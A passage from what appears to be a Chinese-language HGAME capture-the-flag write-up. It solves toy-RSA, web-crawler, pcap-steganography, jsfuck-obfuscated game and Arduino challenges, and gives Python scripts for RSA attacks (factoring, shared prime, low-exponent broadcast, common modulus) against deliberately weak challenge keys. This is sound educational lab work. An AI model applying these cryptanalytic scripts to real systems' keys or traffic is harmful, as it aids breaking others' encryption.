= getPrime(<span class="hljs-number">8</span>)<br>    q = getPrime(<span class="hljs-number">8</span>)<br>    e = randint(<span class="hljs-number">0</span>, p * q)<br>    <span class="hljs-keyword">while</span> gcd(e, (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)) != <span class="hljs-number">1</span>:<br>        e = <span class="hljs-built_in">int</span>(next_prime(e))<br>    <span class="hljs-keyword">return</span> e, p, q, <span class="hljs-built_in">pow</span>(<span class="hljs-built_in">ord</span>(c), e, p * q)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(encrypt, flag)))<br>    <span class="hljs-comment"># [(12433, 149, 197, 104), (8147, 131, 167, 6633), (10687, 211, 197, 35594), (19681, 131, 211, 15710), (33577, 251, 211, 38798), (30241, 157, 251, 35973), (293, 211, 157, 31548), (26459, 179, 149, 4778), (27479, 149, 223, 32728), (9029, 223, 137, 20696), (4649, 149, 151, 13418), (11783, 223, 251, 14239), (13537, 179, 137, 11702), (3835, 167, 139, 20051), (30983, 149, 227, 23928), (17581, 157, 131, 5855), (35381, 223, 179, 37774), (2357, 151, 223, 1849), (22649, 211, 229, 7348), (1151, 179, 223, 17982), (8431, 251, 163, 30226), (38501, 193, 211, 30559), (14549, 211, 151, 21143), (24781, 239, 241, 45604), (8051, 179, 131, 7994), (863, 181, 131, 11493), (1117, 239, 157, 12579), (7561, 149, 199, 8960), (19813, 239, 229, 53463), (4943, 131, 157, 14606), (29077, 191, 181, 33446), (18583, 211, 163, 31800), (30643, 173, 191, 27293), (11617, 223, 251, 13448), (19051, 191, 151, 21676), (18367, 179, 157, 14139), (18861, 149, 191, 5139), (9581, 211, 193, 25595)]</span><br></code></pre></td></tr></table></figure><p>map(func, seq1[, seq2,…])<br>第一个参数接受一个函数名，后面的参数接受一个或多个可迭代的序列，返回的是一个集合。<br>Python函数编程中的map()函数是将func作用于seq中的每一个元素，并将所有的调用的结果作为一个list返回。如果func为None，作用同zip()。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br>x=[(<span class="hljs-number">12433</span>, <span class="hljs-number">149</span>, <span class="hljs-number">197</span>, <span class="hljs-number">104</span>), (<span class="hljs-number">8147</span>, <span class="hljs-number">131</span>, <span class="hljs-number">167</span>, <span class="hljs-number">6633</span>), (<span class="hljs-number">10687</span>, <span class="hljs-number">211</span>, <span class="hljs-number">197</span>, <span class="hljs-number">35594</span>), (<span class="hljs-number">19681</span>, <span class="hljs-number">131</span>, <span class="hljs-number">211</span>, <span class="hljs-number">15710</span>), (<span class="hljs-number">33577</span>, <span class="hljs-number">251</span>, <span class="hljs-number">211</span>, <span class="hljs-number">38798</span>), (<span class="hljs-number">30241</span>, <span class="hljs-number">157</span>, <span class="hljs-number">251</span>, <span class="hljs-number">35973</span>), (<span class="hljs-number">293</span>, <span class="hljs-number">211</span>, <span class="hljs-number">157</span>, <span class="hljs-number">31548</span>), (<span class="hljs-number">26459</span>, <span class="hljs-number">179</span>, <span class="hljs-number">149</span>, <span class="hljs-number">4778</span>), (<span class="hljs-number">27479</span>, <span class="hljs-number">149</span>, <span class="hljs-number">223</span>, <span class="hljs-number">32728</span>), (<span class="hljs-number">9029</span>, <span class="hljs-number">223</span>, <span class="hljs-number">137</span>, <span class="hljs-number">20696</span>), (<span class="hljs-number">4649</span>, <span class="hljs-number">149</span>, <span class="hljs-number">151</span>, <span class="hljs-number">13418</span>), (<span class="hljs-number">11783</span>, <span class="hljs-number">223</span>, <span class="hljs-number">251</span>, <span class="hljs-number">14239</span>), (<span class="hljs-number">13537</span>, <span class="hljs-number">179</span>, <span class="hljs-number">137</span>, <span class="hljs-number">11702</span>), (<span class="hljs-number">3835</span>, <span class="hljs-number">167</span>, <span class="hljs-number">139</span>, <span class="hljs-number">20051</span>), (<span class="hljs-number">30983</span>, <span class="hljs-number">149</span>, <span class="hljs-number">227</span>, <span class="hljs-number">23928</span>), (<span class="hljs-number">17581</span>, <span class="hljs-number">157</span>, <span class="hljs-number">131</span>, <span class="hljs-number">5855</span>), (<span class="hljs-number">35381</span>, <span class="hljs-number">223</span>, <span class="hljs-number">179</span>, <span class="hljs-number">37774</span>), (<span class="hljs-number">2357</span>, <span class="hljs-number">151</span>, <span class="hljs-number">223</span>, <span class="hljs-number">1849</span>), (<span class="hljs-number">22649</span>, <span class="hljs-number">211</span>, <span class="hljs-number">229</span>, <span class="hljs-number">7348</span>), (<span class="hljs-number">1151</span>, <span class="hljs-number">179</span>, <span class="hljs-number">223</span>, <span class="hljs-number">17982</span>), (<span class="hljs-number">8431</span>, <span class="hljs-number">251</span>, <span class="hljs-number">163</span>, <span class="hljs-number">30226</span>), (<span class="hljs-number">38501</span>, <span class="hljs-number">193</span>, <span class="hljs-number">211</span>, <span class="hljs-number">30559</span>), (<span class="hljs-number">14549</span>, <span class="hljs-number">211</span>, <span class="hljs-number">151</span>, <span class="hljs-number">21143</span>), (<span class="hljs-number">24781</span>, <span class="hljs-number">239</span>, <span class="hljs-number">241</span>, <span class="hljs-number">45604</span>), (<span class="hljs-number">8051</span>, <span class="hljs-number">179</span>, <span class="hljs-number">131</span>, <span class="hljs-number">7994</span>), (<span class="hljs-number">863</span>, <span class="hljs-number">181</span>, <span class="hljs-number">131</span>, <span class="hljs-number">11493</span>), (<span class="hljs-number">1117</span>, <span class="hljs-number">239</span>, <span class="hljs-number">157</span>, <span class="hljs-number">12579</span>), (<span class="hljs-number">7561</span>, <span class="hljs-number">149</span>, <span class="hljs-number">199</span>, <span class="hljs-number">8960</span>), (<span class="hljs-number">19813</span>, <span class="hljs-number">239</span>, <span class="hljs-number">229</span>, <span class="hljs-number">53463</span>), (<span class="hljs-number">4943</span>, <span class="hljs-number">131</span>, <span class="hljs-number">157</span>, <span class="hljs-number">14606</span>), (<span class="hljs-number">29077</span>, <span class="hljs-number">191</span>, <span class="hljs-number">181</span>, <span class="hljs-number">33446</span>), (<span class="hljs-number">18583</span>, <span class="hljs-number">211</span>, <span class="hljs-number">163</span>, <span class="hljs-number">31800</span>), (<span class="hljs-number">30643</span>, <span class="hljs-number">173</span>, <span class="hljs-number">191</span>, <span class="hljs-number">27293</span>), (<span class="hljs-number">11617</span>, <span class="hljs-number">223</span>, <span class="hljs-number">251</span>, <span class="hljs-number">13448</span>), (<span class="hljs-number">19051</span>, <span class="hljs-number">191</span>, <span class="hljs-number">151</span>, <span class="hljs-number">21676</span>), (<span class="hljs-number">18367</span>, <span class="hljs-number">179</span>, <span class="hljs-number">157</span>, <span class="hljs-number">14139</span>), (<span class="hljs-number">18861</span>, <span class="hljs-number">149</span>, <span class="hljs-number">191</span>, <span class="hljs-number">5139</span>), (<span class="hljs-number">9581</span>, <span class="hljs-number">211</span>, <span class="hljs-number">193</span>, <span class="hljs-number">25595</span>)]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> x:<br>    e=i[<span class="hljs-number">0</span>]<br>    p=i[<span class="hljs-number">1</span>]<br>    q=i[<span class="hljs-number">2</span>]<br>    m=i[<span class="hljs-number">3</span>]<br>    phi=(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>    d=gmpy2.invert(e,phi)<br>    c=<span class="hljs-built_in">pow</span>(m,d,p*q)<br>    <span class="hljs-built_in">print</span>(c,end=<span class="hljs-string">&#x27; &#x27;</span>)<br></code></pre></td></tr></table></figure><p>得到104 103 97 109 101 123 76 48 48 107 115 95 108 49 107 101 95 121 48 117 39 118 101 95 109 97 115 116 101 114 101 100 95 82 83 52 33 125<br>推测是Ascii码<br><img src="https://img-blog.csdnimg.cn/bca2d223a1774ecfa14b27d4be157a6c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>得到flag</p><hr><h2 id="2、蛛蛛…嘿嘿♥我的蛛蛛"><a href="#2、蛛蛛…嘿嘿♥我的蛛蛛" class="headerlink" title="2、蛛蛛…嘿嘿♥我的蛛蛛"></a>2、蛛蛛…嘿嘿♥我的蛛蛛<img src="https://img-blog.csdnimg.cn/f04760fc3b13453eaa1d449c2e8d4903.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></h2><p><img src="https://img-blog.csdnimg.cn/f62c71255d0c41108ee446d359608d08.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>查看源码，会有一个url按钮是通往下一关的，关卡很多，加上题目提示spider，编写爬虫程序<br><img src="https://img-blog.csdnimg.cn/07d23598fa5e4403bb2e6f8a1a5e3708.png" alt="在这里插入图片描述"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> lxml <span class="hljs-keyword">import</span> etree<br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br>    headers = &#123;<br>        <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 Edg/97.0.1072.62&#x27;</span><br>    &#125;<br>    url = <span class="hljs-string">&#x27;https://hgame-spider.vidar.club/99c9a3a283&#x27;</span><br>    response = requests.get(url=url, headers=headers)<br>    page_text = response.text<br>    tree = etree.HTML(page_text)<br>    r = tree.xpath(<span class="hljs-string">&#x27;//a/@href&#x27;</span>)<br>    x=url<br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ifHas</span>(<span class="hljs-params"><span class="hljs-built_in">list</span></span>):</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">list</span>:<br>            <span class="hljs-keyword">if</span> i!=<span class="hljs-string">&#x27;&#x27;</span>:<br>                <span class="hljs-keyword">return</span> i<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br>    <span class="hljs-keyword">while</span>(ifHas(r)!=<span class="hljs-literal">None</span>):<br>        url=<span class="hljs-string">&#x27;https://hgame-spider.vidar.club/dc947845b2&#x27;</span>+ifHas(r)<br>        response = requests.get(url=url, headers=headers)<br>        page_text = response.text<br>        tree = etree.HTML(page_text)<br>        r = tree.xpath(<span class="hljs-string">&#x27;//a/@href&#x27;</span>)<br>        x=url<br>        <span class="hljs-built_in">print</span>(x)<br><br></code></pre></td></tr></table></figure><p>运行，拿到最后一个url<br><img src="https://img-blog.csdnimg.cn/e2be056a892a40e4844e5cbe478d8031.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/4830eaa1e9e74509b5faab6a67b4bb89.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>那就找一找<br><img src="https://img-blog.csdnimg.cn/12131f8b93e54476a27e362c08a4374f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>找到了</p><hr><h2 id="3、好康的流量"><a href="#3、好康的流量" class="headerlink" title="3、好康的流量"></a>3、好康的流量</h2><p><img src="https://img-blog.csdnimg.cn/77d7146c9eea4a7cae4343c11bf7b3f1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>一个pcap文件，丢入wireshark<br>[文件]-&gt;[导出对象]-&gt;[IMF]<br>至于为什么是IMF，是试出来的，只有IMF有一个可以导出对象<br><img src="https://img-blog.csdnimg.cn/3c2ec6da552e4f359cb6148d1b94fb8e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>拿到了一张图片<br><img src="https://img-blog.csdnimg.cn/b9222a0bb7634f19af93797de5e08594.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/b47c0ad5244146919100d04e5ac6e2cf.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>丢入stegsolve，更改颜色通道<br><img src="https://img-blog.csdnimg.cn/3e5c4db5d8fc4a4192aac6874e152aa8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>一张条形码<br><a href="https://online-barcode-reader.inliteresearch.com/">条形码在线解密网站</a><br><img src="https://img-blog.csdnimg.cn/68d0c3954fce4ddf9d2b89708e75e422.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>得到一般flag，另一半呢？</p><hr><h2 id="4、Tetris-plus"><a href="#4、Tetris-plus" class="headerlink" title="4、Tetris plus"></a>4、Tetris plus</h2><p><img src="https://img-blog.csdnimg.cn/4834e247feb1488ab8abfacefc5b70ea.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/27e000da1c69499ea492a0d79a78ee73.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>玩到三千分会出现一个dialog“flag 貌似被藏起来了，再找找吧!”<br>要自己找<br><img src="https://img-blog.csdnimg.cn/d4ff8c4d46844a3fa65b75918df006af.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>找到了base64加密的“flag 貌似被藏起来了，再找找吧!”<br>下面有一串jsfuck加密的字符串，解密<br><img src="https://img-blog.csdnimg.cn/7e02bbc201024b629f814c0b305dc437.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>（我发现不同在线工具解密出来不一样，多试几次）<br><a href="http://www.liminba.com/tool/jsfuckdecode/">jsfuck解密</a><br>再次解密<br><img src="https://img-blog.csdnimg.cn/3b794705b99d434490f9c22aa06a5063.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>得到flag</p><hr><h2 id="5、饭卡的uno"><a href="#5、饭卡的uno" class="headerlink" title="5、饭卡的uno"></a>5、饭卡的uno</h2><p>Iot物联网的题目，和硬件相关<br><img src="https://img-blog.csdnimg.cn/25d7dbf39a8b42119d2bdff264373e97.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>打开附件<br><img src="https://img-blog.csdnimg.cn/dbf27cc08fcf47a5b74f066d379adf54.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><a href="https://club.gizwits.com/thread-6962-1-1.html">给Arduino上传HEX文件</a><br><a href="https://0xdf.gitlab.io/hackvent2019/leet">好像是个外国人写的跟着题类似的wp</a></p><hr><h2 id="6、RSA-Attack"><a href="#6、RSA-Attack" class="headerlink" title="6、RSA Attack"></a>6、RSA Attack</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">import</span> libnum<br>e = <span class="hljs-number">65537</span><br>n = <span class="hljs-number">700612512827159827368074182577656505408114629807</span><br>c = <span class="hljs-number">122622425510870177715177368049049966519567512708</span><br><br><span class="hljs-comment">#在线分解工具，分解n</span><br>p= <span class="hljs-number">715800347513314032483037</span><br>q= <span class="hljs-number">978782023871716954857211</span><br>phi=(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>d=gmpy2.invert(e,phi)<br>m=<span class="hljs-built_in">pow</span>(c,d,n)<br><span class="hljs-built_in">print</span>(libnum.n2s(<span class="hljs-built_in">int</span>(m)))<br></code></pre></td></tr></table></figure><hr><h2 id="7、RSA-Attack2"><a href="#7、RSA-Attack2" class="headerlink" title="7、RSA Attack2"></a>7、RSA Attack2</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#题目</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">from</span> math <span class="hljs-keyword">import</span> ceil<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> getPrime<br><span class="hljs-keyword">from</span> libnum <span class="hljs-keyword">import</span> s2n<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag<br><br>flag_parts = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(s2n, re.findall(<span class="hljs-string">rf&quot;.&#123;&#123;,<span class="hljs-subst">&#123;ceil(<span class="hljs-built_in">len</span>(flag) / <span class="hljs-number">3</span>)&#125;</span>&#125;&#125;&quot;</span>, flag)))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;# task1&quot;</span>)<br>m = flag_parts[<span class="hljs-number">0</span>]<br>e = <span class="hljs-number">65537</span><br>p = getPrime(<span class="hljs-number">1024</span>)<br>q = getPrime(<span class="hljs-number">1024</span>)<br>r = getPrime(<span class="hljs-number">1024</span>)<br>n1 = p * q<br>c1 = <span class="hljs-built_in">pow</span>(m, e, n1)<br>n2 = r * q<br>c2 = <span class="hljs-built_in">pow</span>(m, e, n2)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;e =&quot;</span>, e)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;n1 =&quot;</span>, n1)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;c1 =&quot;</span>, c1)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;n2 =&quot;</span>, n2)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;c2 =&quot;</span>, c2)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;# task2&quot;</span>)<br>m = flag_parts[<span class="hljs-number">1</span>]<br>e = <span class="hljs-number">7</span><br>p = getPrime(<span class="hljs-number">1024</span>)<br>q = getPrime(<span class="hljs-number">1024</span>)<br>n = p * q<br>c = <span class="hljs-built_in">pow</span>(m, e, n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;e =&quot;</span>, e)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;n =&quot;</span>, n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;c =&quot;</span>, c)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;# task3&quot;</span>)<br>m = flag_parts[<span class="hljs-number">2</span>]<br>p = getPrime(<span class="hljs-number">1024</span>)<br>q = getPrime(<span class="hljs-number">1024</span>)<br>n = p * q<br>e1 = getPrime(<span class="hljs-number">32</span>)<br>e2 = getPrime(<span class="hljs-number">32</span>)<br>c1 = <span class="hljs-built_in">pow</span>(m, e1, n)<br>c2 = <span class="hljs-built_in">pow</span>(m, e2, n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;n =&quot;</span>, n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;e1 =&quot;</span>, e1)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;c1 =&quot;</span>, c1)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;e2 =&quot;</span>, e2)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;c2 =&quot;</span>, c2)<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/8443b0e76752499bb356213b9ebe30a1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#task1 N不互素（共享素数）</span><br><span class="hljs-keyword">import</span> libnum<br><span class="hljs-keyword">import</span> gmpy2<br><br>e = <span class="hljs-number">65537</span><br>n1 = <br>c1 = <br>n2 = <br>c2 = <br><br><span class="hljs-comment">#求最大公约数</span><br>q=gmpy2.gcd(n1,n2)<br>p1=n1//q<br><br>phi_n=(q-<span class="hljs-number">1</span>)*(p1-<span class="hljs-number">1</span>)<br><span class="hljs-comment">#求逆元d</span><br>d1=libnum.invmod(e,phi_n)<br>m=<span class="hljs-built_in">pow</span>(c1,d1,n1)<br><span class="hljs-built_in">print</span>(m)<br><span class="hljs-comment">#数字转字节，转字符串</span><br><span class="hljs-built_in">print</span>(libnum.n2s(<span class="hljs-built_in">int</span>(m)).decode())<br></code></pre></td></tr></table></figure><p><a href="https://www.bilibili.com/read/cv13406617?spm_id_from=333.999.0.0">低加密指数广播攻击指路脚本</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#task2 低加密指数广播攻击</span><br><span class="hljs-keyword">import</span> libnum<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> invert, gcd, iroot<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">op</span>(<span class="hljs-params">x</span>):</span><br>    res = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> x:<br>        res *= i<br>    <span class="hljs-keyword">return</span> res<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">CRT</span>(<span class="hljs-params">m, a</span>):</span><br>    <span class="hljs-keyword">assert</span> (<span class="hljs-built_in">len</span>(m) == <span class="hljs-built_in">len</span>(a))<br>    M = op(m)<br>    <span class="hljs-built_in">sum</span> = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> m, a <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(m, a):<br>        Mi = M // m<br>        ti = invert(Mi, m)<br>        <span class="hljs-built_in">sum</span> += a * ti * Mi<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">sum</span> % M<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">GCRT</span>(<span class="hljs-params">m, a</span>):</span><br>    <span class="hljs-keyword">assert</span> (<span class="hljs-built_in">len</span>(m) == <span class="hljs-built_in">len</span>(a))<br>    curm, cura = m[<span class="hljs-number">0</span>], a[<span class="hljs-number">0</span>]<br>    <span class="hljs-keyword">for</span> m, a <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(m[<span class="hljs-number">1</span>:], a[<span class="hljs-number">1</span>:]):<br>        d = gcd(curm, m)<br>        c = a - cura<br>        <span class="hljs-keyword">assert</span> (c % d == <span class="hljs-number">0</span>)<br>        K = c // d * invert(curm // d, m // d)<br>        cura += curm * K<br>        curm = curm * m // d<br>    <span class="hljs-keyword">return</span> cura % curm<br><br>e = <span class="hljs-number">7</span><br>n = []<br>c = []<br>m = CRT(n, c)<br>m1 = iroot(m, e)  <span class="hljs-comment"># 开e次方</span><br><span class="hljs-built_in">print</span>(m1)<br><span class="hljs-built_in">print</span>(libnum.n2s(<span class="hljs-built_in">int</span>(m1[<span class="hljs-number">0</span>])))<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#task3  共模攻击脚本</span><br><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#数字n、c1、c2都太长了，我直接去了</span><br>n=<br>e1= <span class="hljs-number">2519901323</span><br>e2= <span class="hljs-number">3676335737</span><br>c1=<br>c2=<br>gcd, s, t = gmpy2.gcdext(e1, e2)<br><span class="hljs-comment">#广义欧几里得求出s,t  gcdext返回值为e1,e2最大公因数和s、t。 s*e1+t*e2=(e1,e2)</span><br><br><span 